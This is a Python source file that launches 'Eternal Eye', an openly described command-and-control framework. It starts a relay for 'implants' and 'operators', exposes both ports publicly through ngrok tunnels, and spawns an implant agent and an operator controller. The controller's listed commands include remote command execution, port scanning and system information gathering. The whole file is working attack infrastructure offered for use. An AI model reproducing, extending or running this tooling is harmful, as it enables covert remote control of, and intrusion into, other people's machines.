#!/usr/bin/env python3
"""
Eternal Eye - Automated Launcher
Automatically opens all necessary terminals and starts the system
"""

import os
import sys
import time
import threading
import subprocess
import platform
from pyngrok import ngrok, conf
import json
import webbrowser

class EternalEyeLauncher:
    def __init__(self):
        self.system = platform.system()
        self.relay_process = None
        self.ngrok_tunnels = {}
        self.connection_info = {}
        
    def detect_terminal(self):
        """Detect the best terminal emulator for the system"""
        if self.system == "Windows":
            return "cmd", "/k"
        elif self.system == "Darwin":  # macOS
            return "open", "-a", "Terminal"
        else:  # Linux
            # Try different terminal emulators
            for term in ["gnome-terminal", "konsole", "xterm", "terminator"]:
                if self.check_command_exists(term):
                    return term, ""
            return "xterm", ""
    
    def check_command_exists(self, command):
        """Check if a command exists on the system"""
        try:
            subprocess.run([command, "--version"], capture_output=True, check=False)
            return True
        except:
            return False
    
    def install_dependencies(self):
        """Install required Python packages"""
        print("📦 Installing dependencies...")
        requirements = ["websockets", "psutil", "pyngrok"]
        
        for package in requirements:
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", package], 
                             check=True, capture_output=True)
                print(f"  ✓ {package}")
            except subprocess.CalledProcessError:
                print(f"  ✗ Failed to install {package}")
                return False
        return True
    
    def setup_ngrok(self):
        """Setup ngrok authentication"""
        print("🔐 Setting up ngrok...")
        
        # Check if ngrok is installed
        try:
            import pyngrok
        except ImportError:
            print("  Installing pyngrok...")
            subprocess.run([sys.executable, "-m", "pip", "install", "pyngrok"], check=True)
        
        # Get ngrok auth token from user or use default
        auth_token = input("Enter your ngrok auth token (get from https://dashboard.ngrok.com): ").strip()
        
        if not auth_token:
            print("  Using community version (limited)")
        else:
            try:
                ngrok.set_auth_token(auth_token)
                print("  ✓ Ngrok authenticated")
            except Exception as e:
                print(f"  ✗ Ngrok auth failed: {e}")
    
    def start_relay_server(self):
        """Start the relay server in a new terminal"""
        print("🖥️  Starting relay server...")
        
        relay_script = """
import asyncio
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from relay.server import EternalEyeRelay

async def main():
    server = EternalEyeRelay()
    print("🚀 Eternal Eye Relay Server Started!")
    print("   - Implants connect on port 8765")
    print("   - Operators connect on port 8766")
    await server.start_server()

if __name__ == "__main__":
    asyncio.run(main())
"""
        
        # Write temporary relay starter
        with open("relay_starter.py", "w") as f:
            f.write(relay_script)
        
        terminal_cmd, *terminal_args = self.detect_terminal()
        
        if self.system == "Windows":
            self.relay_process = subprocess.Popen([terminal_cmd, "/k", "python", "relay_starter.py"])
        elif self.system == "Darwin":
            self.relay_process = subprocess.Popen([
                "osascript", "-e", 
                f'tell app "Terminal" to do script "cd {os.getcwd()} && python3 relay_starter.py"'
            ])
        else:  # Linux
            self.relay_process = subprocess.Popen([
                terminal_cmd, "--", "bash", "-c", 
                f"cd {os.getcwd()} && python3 relay_starter.py; exec bash"
            ])
        
        time.sleep(3)  # Give relay time to start
    
    def setup_tunnels(self):
        """Setup ngrok tunnels"""
        print("🌐 Setting up ngrok tunnels...")
        
        try:
            # Create tunnels
            implant_tunnel = ngrok.connect(8765, "tcp", bind_tls=True)
            operator_tunnel = ngrok.connect(8766, "tcp", bind_tls=True)
            
            # Extract connection info
            implant_url = implant_tunnel.public_url.replace("tcp://", "").split(":")
            operator_url = operator_tunnel.public_url.replace("tcp://", "").split(":")
            
            self.ngrok_tunnels = {
                'implant': {'host': implant_url[0], 'port': implant_url[1]},
                'operator': {'host': operator_url[0], 'port': operator_url[1]}
            }
            
            self.connection_info = {
                'implant_host': implant_url[0],
                'implant_port': implant_url[1],
                'operator_host': operator_url[0], 
                'operator_port': operator_url[1],
                'timestamp': time.time()
            }
            
            # Save connection info
            with open("connection_info.json", "w") as f:
                json.dump(self.connection_info, f, indent=2)
            
            print("  ✓ Tunnels established!")
            print(f"  Implant Endpoint:  {implant_url[0]}:{implant_url[1]}")
            print(f"  Operator Endpoint: {operator_url[0]}:{operator_url[1]}")
            
            return True
            
        except Exception as e:
            print(f"  ✗ Failed to create tunnels: {e}")
            return False
    
    def start_implant_terminal(self):
        """Start implant in a new terminal"""
        print("🔗 Starting implant terminal...")
        
        if not self.connection_info:
            print("  ✗ No connection info available")
            return
        
        implant_script = f"""
import asyncio
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from implant.agent import EternalEyeImplant

async def main():
    print("🎯 Eternal Eye Implant Started!")
    print("   Connecting to relay...")
    implant = EternalEyeImplant('{self.connection_info['implant_host']}', {self.connection_info['implant_port']})
    await implant.run()

if __name__ == "__main__":
    asyncio.run(main())
"""
        
        # Write temporary implant starter
        with open("implant_starter.py", "w") as f:
            f.write(implant_script)
        
        terminal_cmd, *terminal_args = self.detect_terminal()
        
        if self.system == "Windows":
            subprocess.Popen([terminal_cmd, "/k", "python", "implant_starter.py"])
        elif self.system == "Darwin":
            subprocess.Popen([
                "osascript", "-e", 
                f'tell app "Terminal" to do script "cd {os.getcwd()} && python3 implant_starter.py"'
            ])
        else:  # Linux
            subprocess.Popen([
                terminal_cmd, "--", "bash", "-c", 
                f"cd {os.getcwd()} && python3 implant_starter.py; exec bash"
            ])
    
    def start_controller_terminal(self):
        """Start controller in a new terminal"""
        print("🎮 Starting controller terminal...")
        
        if not self.connection_info:
            print("  ✗ No connection info available")
            return
        
        controller_script = f"""
import asyncio
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from controller.client import EternalEyeController

async def main():
    print("🎛️  Eternal Eye Controller Started!")
    print("   Connecting to relay...")
    controller = EternalEyeController('{self.connection_info['operator_host']}', {self.connection_info['operator_port']})
    await controller.run()

if __name__ == "__main__":
    asyncio.run(main())
"""
        
        # Write temporary controller starter
        with open("controller_starter.py", "w") as f:
            f.write(controller_script)
        
        terminal_cmd, *terminal_args = self.detect_terminal()
        
        if self.system == "Windows":
            subprocess.Popen([terminal_cmd, "/k", "python", "controller_starter.py"])
        elif self.system == "Darwin":
            subprocess.Popen([
                "osascript", "-e", 
                f'tell app "Terminal" to do script "cd {os.getcwd()} && python3 controller_starter.py"'
            ])
        else:  # Linux
            subprocess.Popen([
                terminal_cmd, "--", "bash", "-c", 
                f"cd {os.getcwd()} && python3 controller_starter.py; exec bash"
            ])
    
    def display_connection_info(self):
        """Display connection information"""
        print("\n" + "="*60)
        print("🎯 ETERNAL EYE - AUTOMATED LAUNCHER")
        print("="*60)
        
        if self.connection_info:
            print(f"Implant Connection:")
            print(f"  python3 implant/agent.py --relay {self.connection_info['implant_host']} --port {self.connection_info['implant_port']}")
            print(f"\nController Connection:")
            print(f"  python3 controller/client.py --relay {self.connection_info['operator_host']} --port {self.connection_info['operator_port']}")
        else:
            print("Connection info not available")
        
        print("\n📋 Quick Commands (in controller):")
        print("  list                    # Show implants")
        print("  use 1                   # Select first implant") 
        print("  exec whoami             # Execute command")
        print("  scan 127.0.0.1          # Port scan")
        print("  info                    # System information")
        print("="*60)
    
    def open_web_interface(self):
        """Open web interface for monitoring"""
        try:
            # Create a simple web interface
            web_script = """
import http.server
import socketserver
import json
import os

class EternalEyeHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            try:
                with open('connection_info.json', 'r') as f:
                    data = json.load(f)
                self.wfile.write(json.dumps(data).encode())
            except:
                self.wfile.write(json.dumps({'status': 'no_data'}).encode())
        else:
            super().do_GET()

PORT = 8080
with socketserver.TCPServer(("", PORT), EternalEyeHandler) as httpd:
    print(f"Web interface at http://localhost:{PORT}")
    httpd.serve_forever()
"""
            with open("web_interface.py", "w") as f:
                f.write(web_script)
            
            # Start web interface in background
            subprocess.Popen([sys.executable, "web_interface.py"], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(2)
            webbrowser.open("http://localhost:8080")
            print("🌐 Web interface opened in browser")
            
        except Exception as e:
            print(f"  ✗ Web interface failed: {e}")
    
    def cleanup(self):
        """Cleanup temporary files"""
        temp_files = ["relay_starter.py", "implant_starter.py", "controller_starter.py", 
                     "web_interface.py", "connection_info.json"]
        
        for file in temp_files:
            try:
                if os.path.exists(file):
                    os.remove(file)
            except:
                pass
    
    def run(self):
        """Main launcher routine"""
        print("🚀 Starting Eternal Eye Automated Launcher...")
        
        try:
            # Step 1: Install dependencies
            if not self.install_dependencies():
                print("Failed to install dependencies")
                return
            
            # Step 2: Setup ngrok
            self.setup_ngrok()
            
            # Step 3: Start relay server
            self.start_relay_server()
            
            # Step 4: Setup tunnels
            if not self.setup_tunnels():
                print("Failed to setup tunnels")
                return
            
            # Step 5: Start implant terminal
            self.start_implant_terminal()
            time.sleep(2)
            
            # Step 6: Start controller terminal  
            self.start_controller_terminal()
            time.sleep(2)
            
            # Step 7: Display connection info
            self.display_connection_info()
            
            # Step 8: Open web interface
            if input("\nOpen web interface? (y/n): ").lower().startswith('y'):
                self.open_web_interface()
            
            print("\n✅ Eternal Eye is now running!")
            print("   All terminals should be open and connected.")
            print("\nPress Enter to exit and cleanup...")
            input()
            
        except KeyboardInterrupt:
            print("\n🛑 Shutting down...")
        except Exception as e:
            print(f"\n❌ Error: {e}")
        finally:
            self.cleanup()
            print("🧹 Cleanup complete!")

if __name__ == "__main__":
    launcher = EternalEyeLauncher()
    launcher.run()
